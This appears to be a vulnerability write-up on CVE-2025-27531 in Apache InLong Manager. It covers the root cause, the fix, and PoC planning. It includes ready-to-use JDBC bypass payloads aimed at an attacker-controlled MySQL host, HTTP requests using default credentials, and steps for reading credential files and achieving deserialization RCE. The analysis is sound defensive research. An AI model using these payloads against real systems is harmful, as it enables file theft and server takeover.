# Vulnerability Analysis: CVE-2025-27531

## Executive Summary

CVE-2025-27531 is a JDBC URL sanitization bypass in Apache InLong Manager (v1.13.0 to < v2.1.0) that allows an authenticated user to inject dangerous MySQL JDBC connection parameters (`autoDeserialize`, `allowLoadLocalInfile`, `allowUrlInLocalInfile`) past a blocklist filter. The root cause is a **single-pass string replacement** that is trivially defeated by a **double-write (nesting) technique** combined with MySQL Connector/J's `address=()` URL format, which bypasses the secondary query-string defense.

Exploitation enables **arbitrary file read** from the InLong Manager server (via `LOAD DATA LOCAL INFILE` through a rogue MySQL server) and **remote code execution** (via Java deserialization through `autoDeserialize=true`).

---

## Root Cause

### Vulnerability Class
**CWE-502 / CWE-20**: Insufficient input sanitization leading to deserialization of untrusted data. More precisely, a **single-pass blocklist bypass via double-writing (string nesting)**.

### Technical Description

The `MySQLSensitiveUrlUtils.filterSensitive()` method in `inlong-manager/manager-pojo` is intended to strip dangerous MySQL JDBC connection parameters from user-supplied URLs. The sanitizer uses `StringUtils.replaceIgnoreCase()` in a **single-pass `for` loop** to remove substrings matching `<sensitive_key>=true` and `<sensitive_key>=yes`:

```java
// Vulnerable code — MySQLSensitiveUrlUtils.java lines 74-79 (v2.0.0)
for (String key : SENSITIVE_REPLACE_PARAM_MAP.keySet()) {
    resultUrl = StringUtils.replaceIgnoreCase(resultUrl, key + "=" + "true", "");
    resultUrl = StringUtils.replaceIgnoreCase(resultUrl, key + "=" + "yes", "");
}
```

The sensitive parameters being filtered are:
- `autoDeserialize` → replaced with `false`
- `allowLoadLocalInfile` → replaced with `false`
- `allowUrlInLocalInfile` → replaced with `false`
- `allowLoadLocalInfileInPath` → removed entirely

### The Double-Write Bypass

Because the sanitizer performs only **one pass** per key, an attacker can embed a sensitive parameter name **within itself** so that after the sanitizer removes the inner occurrence, the outer fragments reassemble the dangerous parameter:

```
Input:   allowLoadallowLoadLocalInfile=trueLocalInfile=true
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                  inner match removed by sanitizer

After:   allowLoad                          LocalInfile=true
         → concatenates to: allowLoadLocalInfile=true
```

### Why the Secondary Defense Doesn't Help

The sanitizer has a secondary defense (lines 80-108) that parses `?key=value&key2=value2` query-string format URLs, checks each key against the sensitive map, and replaces them. However, this defense **only activates for URLs containing a `?` character**.

MySQL Connector/J supports an alternative URL format: `jdbc:mysql://address=(host=H)(port=P)(<property>=<value>)`. This **address-list format** does NOT use `?` separators, so the secondary defense is **completely bypassed**.

---

## Vulnerable File(s) and Function(s)

### Primary Vulnerable Code

| File | Function | Lines | Description |
|------|----------|-------|-------------|
| `inlong-manager/manager-pojo/src/main/java/org/apache/inlong/manager/pojo/util/MySQLSensitiveUrlUtils.java` | `filterSensitive(String url)` | 62-116 | Core sanitization logic with single-pass `for` loop (lines 74-79) |

### Callers (Entry Points into Vulnerable Code)

| File | Function | Lines | Path |
|------|----------|-------|------|
| `inlong-manager/manager-pojo/src/main/java/org/apache/inlong/manager/pojo/sink/mysql/MySQLSinkDTO.java` | `getFromRequest()` → `filterSensitive()` | 85-90, 197-199 | `POST /api/sink/save` → `MySQLSinkOperator` → `MySQLSinkDTO.getFromRequest()` |
| `inlong-manager/manager-pojo/src/main/java/org/apache/inlong/manager/pojo/node/mysql/MySQLDataNodeDTO.java` | `convertToJdbcurl()` → `filterSensitive()` | 79-85 | `POST /api/node/save` → `MySQLDataNodeDTO.convertToJdbcurl()` |
| `inlong-manager/manager-pojo/src/main/java/org/apache/inlong/manager/pojo/node/starrocks/StarRocksDataNodeDTO.java` | `convertToJdbcUrl()` → `filterSensitive()` | 74-76 | `POST /api/node/save` (StarRocks type) |

---

## Triggering Input

### Primary Exploit Payload (address-list format)

**Target: `allowLoadLocalInfile` bypass (arbitrary file read)**
```
jdbc:mysql://address=(host=ATTACKER_MYSQL_HOST)(port=3306)(allowLoadallowLoadLocalInfile=trueLocalInfile=true)/test
```

**Target: `autoDeserialize` bypass (RCE via deserialization)**
```
jdbc:mysql://address=(host=ATTACKER_MYSQL_HOST)(port=3306)(autoDeautoDeserialize=trueserialize=true)/test
```

**Target: `allowUrlInLocalInfile` bypass (URL-based file read)**
```
jdbc:mysql://address=(host=ATTACKER_MYSQL_HOST)(port=3306)(allowUrlInallowUrlInLocalInfile=trueLocalInfile=true)/test
```

**Combined multi-param bypass:**
```
jdbc:mysql://address=(host=ATTACKER_MYSQL_HOST)(port=3306)(autoDeautoDeserialize=trueserialize=true)(allowLoadallowLoadLocalInfile=trueLocalInfile=true)/test
```

### Sanitizer Walkthrough (Step-by-Step)

Input: `jdbc:mysql://address=(host=evil)(port=3306)(allowLoadallowLoadLocalInfile=trueLocalInfile=true)/test`

1. **URL decode loop**: No `%` characters → skip
2. **Whitespace removal**: No whitespace → skip
3. **For loop iteration — key `autoDeserialize`**:
   - Replace `autoDeserialize=true` → no match
   - Replace `autoDeserialize=yes` → no match
4. **For loop iteration — key `allowLoadLocalInfile`**:
   - Replace `allowLoadLocalInfile=true` → finds inner match:
     ```
     (allowLoad[allowLoadLocalInfile=true]LocalInfile=true)
     ```
   - After removal: `(allowLoadLocalInfile=true)`
   - Replace `allowLoadLocalInfile=yes` → no match (value is `true`)
5. **For loop iteration — key `allowUrlInLocalInfile`**:
   - No match
6. **`?` check**: URL contains no `?` → secondary defense **skipped entirely**
7. **Return**: `jdbc:mysql://address=(host=evil)(port=3306)(allowLoadLocalInfile=true)/test`

**The dangerous parameter `allowLoadLocalInfile=true` survives sanitization.**

---

## Attack Scenario

### Prerequisites
- Apache InLong Manager v2.0.0 (or any v1.13.0 to <v2.1.0) deployed with its backend MySQL database
- Valid InLong Manager credentials (default: `admin` / `inlong`)
- Attacker-controlled MySQL server (rogue server for exploitation)

### Step-by-Step Attack

**Step 1: Authenticate**
```http
POST /api/anno/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"inlong"}
```
Response returns session cookie (Apache Shiro `JSESSIONID`).

**Step 2: Inject Malicious JDBC URL via Sink Creation**
```http
POST /api/sink/save HTTP/1.1
Content-Type: application/json
Cookie: JSESSIONID=<session>

{
  "sinkType": "MYSQL",
  "sinkName": "exploit-sink",
  "inlongGroupId": "<valid_group_id>",
  "inlongStreamId": "<valid_stream_id>",
  "jdbcUrl": "jdbc:mysql://address=(host=ATTACKER_IP)(port=3306)(allowLoadallowLoadLocalInfile=trueLocalInfile=true)/test",
  "username": "root",
  "password": "test",
  "databaseName": "test",
  "tableName": "test"
}
```

The `jdbcUrl` passes through `MySQLSinkDTO.getFromRequest()` → `filterSensitive()`, and the double-write bypass causes `allowLoadLocalInfile=true` to survive. The malicious URL is stored in the database.

**Step 3: Trigger Connection to Rogue MySQL**
When InLong Manager establishes a JDBC connection to the attacker-controlled MySQL server (triggered automatically during sink validation, data ingestion, or manually via connection test), the connection is made with `allowLoadLocalInfile=true`.

**Step 4: Exploit — File Read**
The rogue MySQL server responds with a `LOAD DATA LOCAL INFILE '/etc/passwd'` request. The MySQL Connector/J client (with `allowLoadLocalInfile=true`) reads the requested file from the InLong Manager server and sends its contents to the attacker.

**Step 5: Exploit — RCE (via autoDeserialize)**
Using the `autoDeserialize=true` bypass payload instead, the attacker's rogue MySQL server returns crafted binary data in result set columns. MySQL Connector/J deserializes this data as Java objects, achieving Remote Code Execution via known gadget chains (e.g., Commons Collections, JNDI lookup).

### Alternative Entry Points
- `POST /api/sink/update` — Update an existing sink's JDBC URL
- `POST /api/node/save` — Create a MySQL data node with crafted URL (via `MySQLDataNodeDTO.convertToJdbcurl()`)
- `POST /api/node/update` — Update existing node
- `POST /api/node/testConnection` — Directly trigger a connection test

---

## Impact

| Impact | Mechanism | Severity |
|--------|-----------|----------|
| **Arbitrary File Read** | `allowLoadLocalInfile=true` + rogue MySQL `LOAD DATA LOCAL INFILE` | HIGH — reads any file accessible to the InLong Manager Java process |
| **Remote Code Execution** | `autoDeserialize=true` + rogue MySQL returning serialized Java objects | CRITICAL — full server compromise via deserialization gadget chains |
| **URL-based File Read** | `allowUrlInLocalInfile=true` + rogue MySQL | HIGH — load files from URLs |

**CVSS 3.1**: 9.8 (CRITICAL) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
(Note: CVSS rates as PR:N but authentication IS required — however, default credentials are well-known)

---

## Authentication Requirements

**Authentication is required.** The InLong Manager REST API uses Apache Shiro session-based authentication.

### Authentication Flow for PoC

1. **Login endpoint**: `POST /api/anno/login`
2. **Request body**: `{"username": "admin", "password": "inlong"}` (default credentials)
3. **Response**: HTTP 200 with `Set-Cookie: JSESSIONID=<session_id>; Path=/; HttpOnly`
4. **Subsequent requests**: Include `Cookie: JSESSIONID=<session_id>` header
5. **Session type**: HTTP session managed by Apache Shiro 1.13.0
6. **Token format**: Standard Servlet JSESSIONID cookie

### InLong Group/Stream Requirements
To create a sink via `POST /api/sink/save`, a valid `inlongGroupId` and `inlongStreamId` must exist. These can be created via:
- `POST /api/group/save` — Create an inlong group
- `POST /api/stream/save` — Create a stream within the group

The `POST /api/node/save` endpoint does NOT require a pre-existing group/stream.

---

## Fix Assessment

### Fix 1: Double-Write Bypass (commit `ebcd6d3`, released in v2.1.0)

**Change**: Replaced single-pass `for` loop with iterative `while` loop:
```java
// Fixed code
String sensitiveKey = containSensitiveKey(resultUrl);
while (StringUtils.isNotBlank(sensitiveKey)) {
    resultUrl = StringUtils.replaceIgnoreCase(resultUrl, sensitiveKey + "=" + "true", "");
    resultUrl = StringUtils.replaceIgnoreCase(resultUrl, sensitiveKey + "=" + "yes", "");
    sensitiveKey = containSensitiveKey(resultUrl);
}
```

Added helper method:
```java
public static String containSensitiveKey(String url) {
    for (String key : SENSITIVE_REPLACE_PARAM_MAP.keySet()) {
        if (url.contains(key + "=" + "true")
                || url.contains(key + "=" + "yes")) {
            return key;
        }
    }
    return null;
}
```

**Assessment for v2.1.0 fix**: The `while` loop correctly addresses the double-write bypass by iterating until no more sensitive keys are detected. Multi-level nesting (triple-write, etc.) is also handled because each iteration peels one layer.

**However**, the `containSensitiveKey()` method uses **case-sensitive** `String.contains()` while the removal uses **case-insensitive** `StringUtils.replaceIgnoreCase()`. This means:
- `allowLoadLocalInfile=TRUE` → `containSensitiveKey` checks for `allowLoadLocalInfile=true` (lowercase) → **not found** → while loop exits → value survives
- `allowLoadLocalInfile=True` → same issue → survives
- MySQL Connector/J accepts `TRUE`, `True`, `tRuE` as truthy

This is a **case-sensitivity bypass** in the v2.1.0 fix, addressed by Fix 2.

### Fix 2: Case-Sensitivity Bypass (commit `86c893c`, post-v2.1.0 on master)

**Change**: `String.contains()` → `StringUtils.containsIgnoreCase()` in `containSensitiveKey()`:
```java
if (StringUtils.containsIgnoreCase(url, key + "=" + "true")
        || StringUtils.containsIgnoreCase(url, key + "=" + "yes")) {
```

**Assessment**: This correctly addresses the case-sensitivity gap. With both fixes applied, the sanitizer handles:
- Double-write nesting (any depth)
- Case-insensitive parameter values
- URL-encoded input (decoded in a prior loop)
- Whitespace injection (stripped before sanitization)

### Remaining Considerations

The fix is **adequate for the specific double-write and case-sensitivity vectors**. No concrete bypasses remain for the `MySQLSensitiveUrlUtils.filterSensitive()` method with both fixes applied. The approach of iterative removal until convergence is sound.

One architectural note: the approach is still a blocklist (deny-list) rather than an allowlist. If new dangerous MySQL JDBC parameters are discovered in the future, they would need to be added to `SENSITIVE_REPLACE_PARAM_MAP`. However, this is not a bypass of the current fix.

---

## Escalation Path

**File Read → Credential Harvest → Full Compromise**

1. Use `allowLoadLocalInfile=true` bypass to read sensitive files:
   - `/opt/inlong-manager/conf/application.properties` — contains database credentials, Shiro secrets
   - `/etc/passwd`, `/etc/shadow` (if readable)
   - Environment variables at `/proc/self/environ` — may contain `MYSQL_ROOT_PASSWORD`, `JDBC_URL` credentials
2. Use harvested database credentials to directly connect to backend MySQL and escalate
3. Alternatively, use `autoDeserialize=true` bypass for **direct RCE** without needing file read:
   - Rogue MySQL server returns serialized Java objects in result columns
   - MySQL Connector/J 8.0.28 (used by InLong 2.0.0) will deserialize them when `autoDeserialize=true`
   - Known gadget chains: Commons Collections, Spring framework gadgets, etc.
   - This yields arbitrary command execution as the InLong Manager service user (typically root in Docker)

**Direct RCE is the highest-impact path** and does not require file read as an intermediate step.

---

## Related Attack Surface

### Sink DTOs WITHOUT JDBC URL Sanitization

The following database sink DTOs accept user-controlled `jdbcUrl` fields but do **NOT** call `filterSensitive()`:

| File | Class | JDBC URL Field |
|------|-------|---------------|
| `.../pojo/sink/oracle/OracleSinkDTO.java` | `OracleSinkDTO` | `jdbcUrl` (line ~53) |
| `.../pojo/sink/postgresql/PostgreSQLSinkDTO.java` | `PostgreSQLSinkDTO` | `jdbcUrl` (line ~54) |
| `.../pojo/sink/sqlserver/SQLServerSinkDTO.java` | `SQLServerSinkDTO` | `jdbcUrl` (line ~53) |
| `.../pojo/sink/greenplum/GreenplumSinkDTO.java` | `GreenplumSinkDTO` | `jdbcUrl` (line ~48) |
| `.../pojo/sink/oceanbase/OceanBaseSinkDTO.java` | `OceanBaseSinkDTO` | `jdbcUrl` (line ~59) |
| `.../pojo/sink/ck/ClickHouseSinkDTO.java` | `ClickHouseSinkDTO` | `jdbcUrl` (line ~51) |
| `.../pojo/sink/starrocks/StarRocksSinkDTO.java` | `StarRocksSinkDTO` | `jdbcUrl` (line ~51) |
| `.../pojo/sink/tdsqlpostgresql/TDSQLPostgreSQLSinkDTO.java` | `TDSQLPostgreSQLSinkDTO` | `jdbcUrl` (line ~47) |

### Node DTOs WITHOUT JDBC URL Sanitization

| File | Class |
|------|-------|
| `.../pojo/node/oceanbase/OceanBaseDataNodeDTO.java` | `OceanBaseDataNodeDTO` |
| `.../pojo/node/postgresql/PostgreSQLDataNodeDTO.java` | `PostgreSQLDataNodeDTO` |
| `.../pojo/node/ck/ClickHouseDataNodeDTO.java` | `ClickHouseDataNodeDTO` |

**Note**: These sibling DTOs handle JDBC URLs for other database types. While `MySQLSensitiveUrlUtils` specifically targets MySQL Connector/J parameters, some of these other JDBC drivers also have dangerous connection properties (e.g., ClickHouse JDBC's `allowUrlInLocalInfile`, PostgreSQL JDBC's `socketFactory`). The sanitizer is MySQL-specific and does not protect these other database connectors. This is an additional attack surface but is technically a separate vulnerability (not CVE-2025-27531).

### DTOs WITH Proper Sanitization (Not Vulnerable)

| File | Class | Sanitization |
|------|-------|-------------|
| `.../pojo/sink/mysql/MySQLSinkDTO.java` | `MySQLSinkDTO` | Calls `filterSensitive()` in `getFromRequest()` (line 88) |
| `.../pojo/node/mysql/MySQLDataNodeDTO.java` | `MySQLDataNodeDTO` | Calls `MySQLSinkDTO.filterSensitive()` in `convertToJdbcurl()` (line 84) |
| `.../pojo/node/starrocks/StarRocksDataNodeDTO.java` | `StarRocksDataNodeDTO` | Calls `MySQLSensitiveUrlUtils.filterSensitive()` in `convertToJdbcUrl()` (line 75) |

---

## Build System

### Overview

| Field | Value |
|-------|-------|
| **Build Tool** | Apache Maven 3.x |
| **Java Version** | Java 8 (OpenJDK 8) |
| **Project Version** | 2.0.0 |
| **Spring Boot** | 2.6.15 |
| **MySQL Connector/J** | 8.0.28 |
| **Apache Shiro** | 1.13.0 |
| **Commons Lang3** | (managed by Spring Boot parent) |

### Build Commands

**Full project build** (not recommended — very large project):
```bash
mvn clean install -DskipTests -Dcheckstyle.skip=true -Drat.skip=true -pl inlong-manager -am
```

**Relevant module only** (manager-pojo contains the vulnerable code):
```bash
cd inlong-manager
mvn clean package -DskipTests -Dcheckstyle.skip=true -Drat.skip=true -pl manager-pojo -am
```

**Run unit tests** (to verify the bypass):
```bash
cd inlong-manager
mvn test -pl manager-pojo -Dtest=MySQLSinkDTOTest -Dcheckstyle.skip=true -Drat.skip=true
```

### Dependencies

**System packages (for building)**:
- `openjdk-8-jdk` (or equivalent)
- `maven` (3.6+)
- `git`

**Key Java dependencies** (managed by Maven):
- `org.apache.commons:commons-lang3` — provides `StringUtils.replaceIgnoreCase()` used in the sanitizer
- `mysql:mysql-connector-java:8.0.28` — MySQL JDBC driver (test scope)
- `org.apache.shiro:shiro-spring:1.13.0` — authentication framework
- `org.springframework.boot:spring-boot-starter-web:2.6.15` — web framework

### Runtime Requirements (Docker Lab)

**Recommended approach**: Use pre-built Docker images (no source build needed for PoC):

```yaml
services:
  mysql:
    image: mysql:8.0.28
    environment:
      MYSQL_ROOT_PASSWORD: inlong
    ports:
      - "3306:3306"
    command: --authentication_policy=mysql_native_password

  manager:
    image: inlong/manager:2.0.0
    depends_on:
      mysql:
        condition: service_healthy
    ports:
      - "8083:8083"
    environment:
      JDBC_URL: mysql:3306
      USERNAME: root
      PASSWORD: inlong
```

**SQL initialization**: The manager Docker image auto-initializes the `apache_inlong_manager` database on first start. No manual SQL loading is needed.

**Key services**:
- MySQL 8.0.28 — Backend database (port 3306, root/inlong)
- InLong Manager 2.0.0 — Target (port 8083, admin/inlong)
- Rogue MySQL server — Attacker-controlled (for LOAD DATA LOCAL INFILE exploitation)

**Network requirements**:
- Manager → MySQL backend: TCP 3306 (internal)
- Attacker → Manager: TCP 8083 (REST API)
- Manager → Rogue MySQL: TCP (attacker port) — requires network connectivity from manager container

### Base Image Recommendation

For the lab Docker Compose:
- **Target**: Use `inlong/manager:2.0.0` (pre-built, available on Docker Hub)
- **Database**: Use `mysql:8.0.28`
- **Rogue MySQL**: Can use a Python-based fake MySQL server (e.g., `rogue-mysql-server` or custom script using `mysql-mimic`)
- No source compilation needed for the PoC — the vulnerability is in the REST API layer

---

## PoC Strategy Recommendation

### Approach 1: REST API Black-Box PoC (Recommended)

1. Stand up InLong Manager 2.0.0 + MySQL via Docker Compose
2. Authenticate: `POST /api/anno/login` with `admin`/`inlong`
3. Create inlong group: `POST /api/group/save`
4. Create inlong stream: `POST /api/stream/save`
5. Create MySQL sink with double-write payload: `POST /api/sink/save`
6. Retrieve the stored sink: `GET /api/sink/get/{id}`
7. Verify the stored `jdbcUrl` contains `allowLoadLocalInfile=true` (bypass confirmed)

### Approach 2: REST API + Rogue MySQL (Full Impact Demo)

Steps 1-5 from above, then:
6. Run a rogue MySQL server that sends `LOAD DATA LOCAL INFILE '/etc/passwd'`
7. Create a node or sink pointing to the rogue server with the bypass URL
8. Trigger connection test: `POST /api/node/testConnection`
9. Capture the exfiltrated file contents at the rogue server

### Approach 3: Pure Sanitizer Unit Test (Simplest Verification)

Write a Java unit test or Python script that replays the sanitization logic and demonstrates the bypass. No Docker needed but less impactful as a PoC.

### Recommended Payloads

```python
# Double-write payloads for each sensitive parameter
PAYLOADS = {
    "allowLoadLocalInfile": "jdbc:mysql://address=(host={host})(port={port})(allowLoadallowLoadLocalInfile=trueLocalInfile=true)/test",
    "autoDeserialize": "jdbc:mysql://address=(host={host})(port={port})(autoDeautoDeserialize=trueserialize=true)/test",
    "allowUrlInLocalInfile": "jdbc:mysql://address=(host={host})(port={port})(allowUrlInallowUrlInLocalInfile=trueLocalInfile=true)/test",
}
```
